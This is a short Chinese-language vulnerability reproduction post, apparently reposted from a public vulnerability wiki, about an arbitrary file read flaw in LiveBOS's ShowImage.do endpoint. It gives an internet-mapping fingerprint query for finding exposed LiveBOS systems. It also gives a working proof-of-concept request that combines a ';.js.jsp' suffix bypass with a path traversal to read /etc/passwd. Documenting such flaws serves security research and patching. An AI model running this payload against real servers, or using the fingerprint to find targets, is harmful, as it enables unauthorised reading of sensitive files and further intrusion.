---
title: "LiveBOS ShowImage.do 任意文件读取漏洞"
date: 2026-10-16 09:08:37
categories:
  - WebSecurity
  - CVE
  - "Web应用"
  - "LiveBOS"
tags:
  - "LiveBOS"
  - "任意文件读取"
  - "漏洞复现"
---
## 漏洞描述

LiveBOS ShowImage.do 接口存在任意文件读取漏洞，攻击者通过漏洞可以获取服务器中的敏感文件

## 漏洞影响

LiveBOS

## 网络测绘

```
app="LiveBOS-框架"
```

## 漏洞复现

登陆页面

![image-20230828111822866](https://raw.githubusercontent.com/Threekiii/Vulnerability-Wiki/master/docs-base/docs/webapp/images/image-20230828111822866.png)

验证POC

```
/feed/ShowImage.do;.js.jsp?type=&imgName=../../../../../../../../../../../../../../../etc/passwd
```

![image-20230828111838582](https://raw.githubusercontent.com/Threekiii/Vulnerability-Wiki/master/docs-base/docs/webapp/images/image-20230828111838582.png)

---

> 资料整理自 [Threekiii/Vulnerability-Wiki](https://github.com/Threekiii/Vulnerability-Wiki/blob/master/docs-base/docs/webapp/LiveBOS-ShowImage.do-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E.md)
